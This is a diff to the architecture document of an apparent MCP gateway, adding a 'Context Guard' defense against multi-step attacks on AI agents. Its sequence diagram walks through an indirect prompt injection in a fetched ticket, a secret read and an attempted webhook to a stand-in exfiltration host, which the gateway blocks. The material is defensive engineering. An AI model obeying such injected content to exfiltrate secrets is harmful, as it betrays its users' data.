@@ -21,6 +21,7 @@ where the two disagree, the code is correct and this file is stale; please file 
 | **CLI** | `agentgate start`/`validate`/`audit verify`/`replay`/`init`/`config validate`/`doctor`/`integrate`/`smoke-test`. | `packages/gateway/src/cli.ts` |
 | **Onboarding CLI modules** (Milestone 5) | Pure, testable logic behind the five onboarding commands — project scaffolding, config/policy validation (reusing the production loaders), read-only diagnostics, client-integration snippet generation, and a self-contained smoke test. | `packages/gateway/src/onboarding/{init,configValidate,doctor,integrate,smokeTest}.ts` |
 | **Tool Integrity Registry** (ADR-0012) | Rug-pull / tool-definition-poisoning defense: server identity, whole-object canonicalization/fingerprinting, an append-only state machine, gateway-path enforcement (discovery filtering + call-dispatch gating), and a bounded safe diff. See the dedicated section below. | `packages/gateway/src/tool-integrity/{identity,canonicalize,scan,registry,enforcement,diff,cli,types}.ts` |
+| **Context Guard** (ADR-0013, Milestone 7) | Cross-tool session-risk escalation defense: one opaque, monotonic-revision execution context per stdio connection, policy-owned source/effect labels, an append-only transition log plus a mutable projection, contextual rule evaluation merged with base policy via a strictest-wins rule, and exact-revision/argument/tool-fingerprint approval binding and revalidation. See the dedicated section below. | `packages/gateway/src/context-guard/{state,rules,enforcement,cli,types}.ts` |
 
 ## System diagram
 
@@ -38,6 +39,7 @@ flowchart LR
         AM["Approval Manager\napproval.ts"]
         AS["Audit Storage\nstorage.ts (SQLite)"]
         RP["Safe Replay Service\nreplay.ts\n(ADR-0010)"]
+        CG["Context Guard\ncontext-guard/*\n(ADR-0013)"]
         CA["Control API\napi/control.ts\n(Fastify, loopback)"]
     end
 
@@ -56,10 +58,15 @@ flowchart LR
     PL -- "sanitize before forwarding" --> OS
     OS -- "sanitized result, or safe blocked error" --> PL
     PL -- "every terminal state (result never persisted raw)" --> AS
+    PL -- "read current labels, evaluate contextual rules, merge with base decision" --> CG
+    PL -- "successful, non-blocked result: append labels" --> CG
+    CG -- "append-only events + mutable projection" --> AS
     PL -- "REQUIRE_APPROVAL" --> AM
     AM --> AS
+    AM -- "context/argument/tool-fingerprint binding + revalidation" --> CG
     CA -- reads/writes --> AS
     CA -- reads/writes --> AM
+    CA -- "read-only status/history/explain, exact-revision reset" --> CG
     CA -- "stored event + current policy" --> RP
     RP -- "comparison (read-only policy eval)" --> CA
     RP -. "no import path — never calls, never connects" .-> D
@@ -389,6 +396,229 @@ flowchart LR
   injection, HTML/script, ANSI escapes, prototype-pollution-shaped keys) is preserved as inert string data,
   never executed or interpreted, and rendered as plain text (never `dangerouslySetInnerHTML`) in the Control
   Center.
+
+## Context Guard (ADR-0013)
+
+Cross-tool session-risk escalation defense for the MCP "confused deputy" pattern: closing individual-call/result/
+definition trust gaps (ADR-0003/ADR-0009/ADR-0012) still leaves the *sequence* across multiple calls unguarded —
+an agent reads untrusted content from tool A, is (possibly) steered by it, then reads sensitive data with tool B
+and exfiltrates it with tool C, where each individual call can look policy-legal in isolation.
+
+**Execution-context boundary.** `startGateway()` (`server.ts`) generates one opaque `contextId`
+(`crypto.randomUUID()`) and creates the context (`createContext()`, `context-guard/state.ts`) once, before
+`startStdioProxy()` is ever called — before any `tools/call` can reach the handler. That one context is captured
+in the single `PipelineContext` object closed over by every `CallToolRequestSchema` handler for the lifetime of
+that one stdio connection/process. This is the most precise boundary the current architecture honestly supports:
+AgentGate's protocol boundary (ADR-0005) is legacy-2025 stdio only, one gateway process per launch, one upstream
+client connection per process. **A context is not a model-conversation identifier** — one stdio connection may
+correspond to many, or only part of, one upstream conversation, depending entirely on how the calling MCP client
+manages its own session; this is a named, explicit limitation, not an implied guarantee. A new gateway process
+launch (restart or reconnect) always creates a brand-new context — there is no cross-restart persistence.
+
+**Context ID, revision, labels.** `context_id` is a locally-generated UUID, opaque to any upstream party — never
+derived from or exposed to the model. `revision` is a strictly monotonic integer: every transition that changes
+labels, or that resets/expires/closes the context, increments it by exactly 1; never decremented, never reused.
+Labels only ever accumulate (`appendContextLabels()` computes the union of existing and new labels) — they are
+never removed except by an explicit, reviewer-attributed reset, which itself does not delete history. Status is
+one of `active` / `expired` / `reset` / `closed`.
+
+**Policy-owned labels and effects.** `context_guard.labels` (`GatewayConfigSchema`) lets an operator declare
+custom labels beyond the built-in vocabulary (`BUILTIN_CONTEXT_LABELS`: `untrusted_content`,
+`sensitive_data_accessed`, `prompt_injection_suspected`; `BUILTIN_EFFECT_LABELS`: `external_communication`,
+`destructive_write`, `code_execution`, `credential_use`, `privilege_change`, `sensitive_read`). Per-tool
+`context_guard.tools.<name>` declares `effects` (what this tool's *call* itself does, checked against the active
+context's labels before allowing) and `adds_on_result` (what labels a *successful, non-blocked* result adds to
+the context afterward). Every label reference in config is validated at parse time against the built-in set plus
+declared custom labels — an unknown label fails config validation, not silently becomes a no-op at runtime. MCP
+tool `annotations` (`readOnlyHint`/etc.) are never consulted for any Context Guard decision, for the same reason
+Tool Integrity never trusts them — a malicious or buggy server cannot self-report its way to a lower risk
+classification.
+
+**Context state machine and append-only history.** Same two-table pattern as `audit_events`/
+`audit_lifecycle_records` (ADR-0004) and `tool_integrity_events`/`tool_integrity_state` (ADR-0012):
+`context_events` is a hash-chained, append-only, sequence-numbered log — every `context_created`/`label_added`/
+`call_evaluated`/`context_reset`/`context_expired`/`context_closed` transition is recorded, never mutated or
+deleted; `context_state` is a mutable projection (one row per `context_id`) needed because every `tools/call`
+needs a cheap "what labels does the active context have right now" lookup, which a full event-log replay on
+every call would make prohibitively slow. `verifyContextChain()` (`storage.ts`) independently re-walks the chain
+exactly like `verifyChain()`/`verifyToolIntegrityChain()` — local tamper *evidence*, not tamper-*proof*, same
+limitation as the audit and Tool Integrity chains. Only label names (bounded, policy vocabulary), safe/bounded
+`reason` strings, and already-redacted `source_event_id` linkage are ever stored — raw tool arguments, raw tool
+results, and any prompt-injection text are never written into `context_events`/`context_state` by any code path.
+
+```mermaid
+stateDiagram-v2
+    [*] --> active: context_created (before first call can be evaluated)
+    active --> active: label_added (union of labels, revision+1)\ncall_evaluated (deny/require_approval/allow, no label change)
+    active --> closed: transport close/error, or stdin 'end' (revision+1)
+    active --> expired: TTL elapsed (schema exists; not yet actively scheduled)
+    active --> reset: exact-revision, reviewer-attributed reset (labels cleared, revision+1)
+    closed --> [*]
+    expired --> [*]
+    reset --> [*]
+```
+
+**Exact evaluation order** (`transport/stdio.ts`, `pipeline.ts` — traced in source, not aspirational):
+
+1. Request validation / argument normalization.
+2. **Tool Integrity quarantine gate** (`checkCallAllowed()`) — runs *before* `runPipeline()` is even called; a
+   call to a tool that is not currently trusted (in an enforcing mode) never reaches any step below, including a
+   call using a cached/direct tool name never returned by `tools/list`.
+3. Base policy decision + input secret checks (`evaluate(policy, input)`).
+4. **Context Guard evaluation** — `evaluateContextGuard()` reads the *current* context labels (fresh from
+   storage) and evaluates `context_guard.rules` (first-match, deterministic, mirroring the base policy engine's
+   own semantics) against the attempted call's declared `effects`. The result is combined with the base policy
+   decision via `isAtLeastAsStrict()`: Context Guard's action replaces the effective decision *only if it is at
+   least as strict* (`ALLOW < REQUIRE_APPROVAL < DENY`) — a base-policy DENY can never become a contextual ALLOW,
+   and an already-REQUIRE_APPROVAL base decision can never be silently downgraded. Always computed and recorded
+   (even in `monitor` mode), but only applied to the effective decision when `mode === 'enforce'`.
+5. Exact contextual approval, if required (see below).
+6. Revalidate the context/approval binding immediately before execution (`checkApprovalContextValid()`).
+7. Downstream call (`executeDownstream()`) — only reached after every gate above has passed.
+8. Result/error safety inspection (`sanitizeToolResult()`, ADR-0009) — runs on the raw downstream result before
+   it is ever returned upstream.
+9. **Append context transitions** — deterministic, outcome-gated: fires *only* when
+   `finalStatus === 'SUCCEEDED' && !resultBlocked`. A DENIED/CANCELLED/EXPIRED call never reached downstream, so
+   it adds no labels; a FAILED call returned no usable result, so it adds no labels; a result-BLOCKED call means
+   nothing the label would describe actually reached the agent, so it adds no labels either. A REDACTED-but-
+   still-delivered result *does* still add its configured labels (content beyond the redacted pattern still
+   reached the agent) — the one place this design accepts under-counting risk rather than inventing a label for
+   content nobody received. A `call_evaluated` history event is recorded for *every* contextually-evaluated call
+   regardless of outcome or mode, so `monitor`-mode "what would have happened" and denied/errored calls remain
+   visible in history even though they never mutate labels.
+10. Audit/SSE publication — storage write → re-fetch → SSE emit, consistently, so a subscriber never observes an
+    event for a state that isn't yet durably persisted.
+
+```mermaid
+sequenceDiagram
+    participant Agent as MCP Client (compromised by injected content)
+    participant Proxy as Gateway
+    participant CG as Context Guard
+    participant Down as Downstream Server
+
+    Agent->>Proxy: tools/call "fetch_ticket" {}
+    Proxy->>Down: execute (base policy allows)
+    Down-->>Proxy: ticket body containing an indirect-prompt-injection instruction
+    Proxy->>CG: successful, non-blocked result → adds_on_result
+    CG-->>Proxy: context revision+1, labels += [untrusted_content]
+
+    Agent->>Proxy: tools/call "read_secret" {}
+    Proxy->>Down: execute (base policy allows)
+    Down-->>Proxy: sensitive value
+    Proxy->>CG: successful, non-blocked result → adds_on_result
+    CG-->>Proxy: context revision+1, labels += [sensitive_data_accessed]
+
+    Agent->>Proxy: tools/call "send_webhook" {url: "https://exfil.example"}
+    Proxy->>CG: evaluate contextual rules against effects=[external_communication]
+    CG-->>Proxy: DENY (rule matched: context_has_any + target_has_any)
+    Note over Proxy,Down: strictest-wins merge with base policy — downstream is NEVER contacted
+    Proxy-->>Agent: {isError: true, text: "External communication blocked: ..."}
+```
+
+**Exact contextual approval binding and revalidation.** When Context Guard's effective decision is
+`REQUIRE_APPROVAL`, `ApprovalManager.create()` is given an optional `contextBinding` recording the *exact*
+`context_id`/`context_revision` observed at that moment, `argument_digest` (SHA-256 of the *redacted* arguments,
+never raw), the `contextual_rule_id` that required it (`'base-policy'` if the base policy alone required it), and
+`tool_fingerprint` — the exact currently-trusted Tool Integrity fingerprint, read via `getTrustedFingerprint()`,
+never a client-supplied value. Every field is nullable; a pre-Milestone-7 or non-contextual approval simply has
+`null` in all of them, meaning "not context-bound," treated as valid and ordinary, never an error. At
+*consumption* time — immediately before downstream execution, after a human has already approved —
+`checkApprovalContextValid()` re-reads current context state fresh and fails closed if: the bound context no
+longer exists; the current revision no longer exactly matches the revision at creation time (risk accumulated in
+the window between creation and a human decision); the argument digest no longer matches; or the tool's *current*
+trusted fingerprint (re-read fresh, never reused from creation time) no longer matches. A `null` bound field
+(nothing was bound at creation) skips that specific check — a binding that was never made cannot be violated;
+this is defense-in-depth alongside, never a replacement for, Tool Integrity's own independent gate. Approval
+consumption remains single-use and TTL-bound; an approval never clears context labels or grants any future call
+permission — it authorizes exactly the one call it was created for, once.
+
+```mermaid
+sequenceDiagram
+    participant Human as Human reviewer
+    participant CA as Control API / CLI
+    participant AM as Approval Manager
+    participant CG as Context Guard state
+
+    Note over CA,CG: Call attempted at context revision N — approval P1 created, bound to rev N
+    CA->>AM: create(contextBinding={context_id, revision: N, argument_digest, tool_fingerprint})
+    Note over CG: a DIFFERENT concurrent call advances the context to revision N+1
+    Human->>AM: approve(P1)
+    AM-->>CA: approval record resolves (status: APPROVED)
+    CA->>CG: checkApprovalContextValid(P1) — re-read CURRENT state fresh
+    CG-->>CA: current revision (N+1) != bound revision (N) — FAIL CLOSED
+    Note over CA,Down: downstream is NEVER contacted for this stale-bound approval
+```
+
+**Reset and pending-approval invalidation.** `resetContext()` requires an exact current-revision match (same
+stale-revision protection pattern as Tool Integrity's exact-fingerprint accept/reject) plus a mandatory reviewer
+identity and reason, both recorded in the append-only history. It clears the active label set going forward while
+never deleting prior `label_added`/`call_evaluated` history, and is entirely local, gateway-side state — it has
+no ability to erase or affect anything the upstream LLM or MCP client itself remembers from before the reset. The
+CLI/API reset route also actively invalidates every pending contextual approval bound to that context
+(`ApprovalManager.deny()` for each), so a pending approval cannot silently outlive the reset it was bound to. A
+stale reset request (formed against a revision that has since advanced) is rejected outright.
+
+**CLI/API/SSE/Control Center data flow.** `context-guard/cli.ts` holds storage-accepting functions
+(`summarizeContexts`, `summarizeContextHistory`, `explainContext`, `performContextReset`,
+`verifyContextChainReport`) reused directly by both `packages/gateway/src/cli.ts`'s `context` subcommand and the
+Control API routes in `api/control.ts` (`GET /api/contexts`, `GET /api/contexts/:id`, `GET /api/contexts/:id/
+history`, `GET /api/contexts/:id/explain`, `POST /api/contexts/:id/reset`, `GET /api/context-integrity`) — never
+two independent implementations. Every route sits behind the same loopback/Host/Origin/CORS/token/
+`Referrer-Policy` middleware as every other Control API route; routes are gated behind an optional `contextGuard`
+opt, 404 when not configured, exactly like the existing `toolIntegrity` opt. `PipelineContext.emitEvent`'s type
+is widened from `AuditEvent` to `AuditEvent | ContextEvent`; the SAME event bus/subscriber list `audit_event`
+traffic already uses now also carries `call_evaluated`/`label_added`/`context_closed`/`context_expired`/
+`context_reset` events, discriminated on the wire by an `event_type` field only `ContextEvent` has (`send('
+context_event', payload)` vs. `send('audit_event', payload)`) — one bus, no second parallel stream, no duplicate
+publication. The Control Center's typed API client (`apps/control-center/src/api.ts`) consumes these read-only
+routes plus the one mutating reset route, and an `onContextEvent` callback on the same `EventSource` the audit
+timeline already uses.
+
+**Stdio lifecycle closure and the SDK `stdin 'end'` gap.** The installed MCP SDK's `StdioServerTransport` (`Server`'s
+`onclose`/`onerror`) only fires when the transport itself closes/errors — but the SDK never listens for
+`process.stdin`'s `'end'` event, so it never calls its own `close()` (and therefore never fires `server.onclose`)
+when the upstream client closes its side of the pipe gracefully (`stdin.end()`, the *first* thing a well-behaved
+client's own `close()` does, well before it escalates to SIGTERM/SIGKILL after a grace period). Without a direct
+listener, a graceful disconnect would leave a context `active` for up to that escalation window — or indefinitely,
+since SIGTERM is not reliably delivered to a Windows child process at all. `transport/stdio.ts` therefore attaches
+its own `process.stdin.on('end', ...)` listener (an OS-level pipe-close notification, not a signal — fires
+reliably cross-platform) that calls the same idempotent `closeOrExpireContext()` used by `server.onclose`/
+`onerror` and by `server.ts`'s SIGINT/SIGTERM handler — three independent trigger paths converging on one
+idempotent transition, so whichever fires first performs the real close and the others are safe no-ops, never a
+race that corrupts state.
+
+**Interaction with Tool Integrity, Safe Replay, approvals, and audit chains.** Tool Integrity's quarantine gate
+runs *before* Context Guard in the evaluation order (step 2 above) and is entirely independent — a quarantined
+tool is blocked regardless of context state, and Context Guard's own fingerprint-binding check (step 6) re-uses
+Tool Integrity's `getTrustedFingerprint()` rather than duplicating trust logic. Safe Replay has no interaction
+with Context Guard at all — it never imports `context-guard/*`, structurally cannot execute or evaluate context,
+and re-evaluates only the base policy decision for a historical event. Every context transition that stems from
+an actual call links back to that call's own already-redacted `source_event_id` in the audit chain, so a reviewer
+can navigate from a context transition to the exact audit event that produced it; the two chains (audit,
+context) are independently hash-chained and independently verified — `agentgate context verify` checks only the
+context chain, `agentgate audit verify` checks only the audit (and replay) chains.
+
+**Migration from Milestone 6.** The Context Guard migration (`storage.ts` `MIGRATIONS`, version 9 /
+`MIGRATION_VERSIONS.CONTEXT_GUARD`) is appended strictly after the Tool Integrity migration, per this project's
+append-only-migrations convention — inserting it earlier would silently renumber every later migration and cause
+an already-upgraded database to skip it entirely. It creates `context_events`/`context_state` and extends
+`approvals` with five nullable binding columns via non-idempotent `ALTER TABLE ADD COLUMN` statements; re-running
+it against an already-migrated schema fails loudly (`duplicate column name`) rather than silently — the correct
+fail-closed behavior for a migration runner. `context_guard: ContextGuardSchema.default({})` means an omitted
+`context_guard` config block defaults to `mode: 'monitor'` — every config file written before this milestone
+keeps working unmodified with zero new blocking behavior.
+
+**Failure modes and fail-closed points.** A malformed `context_guard` config block fails the same
+`loadGatewayConfig()` validation every other malformed config field does — the gateway does not start. An unknown
+label anywhere in `context_guard.tools.*`/`context_guard.rules.*.when.*` fails config validation at parse time,
+never silently becomes a no-op rule at runtime. A stale reset request (revision mismatch) is rejected with a 409/
+non-zero exit, never silently applied against whatever the current revision happens to be. A stale-bound
+contextual approval fails closed at consumption time (see above) even though the approval record itself already
+shows `APPROVED`. Residual, explicitly-named races this milestone does not eliminate: the same scan-to-call
+TOCTOU Tool Integrity already documents is unaffected by Context Guard; a genuine cross-request race remains
+between one call's contextual evaluation and a *different*, concurrently-finishing call's label-append — the
+exact-revision approval-binding mechanism closes this specifically for human-approval consumption, not for every
+possible interleaving.
 
 ## Trust boundaries
 
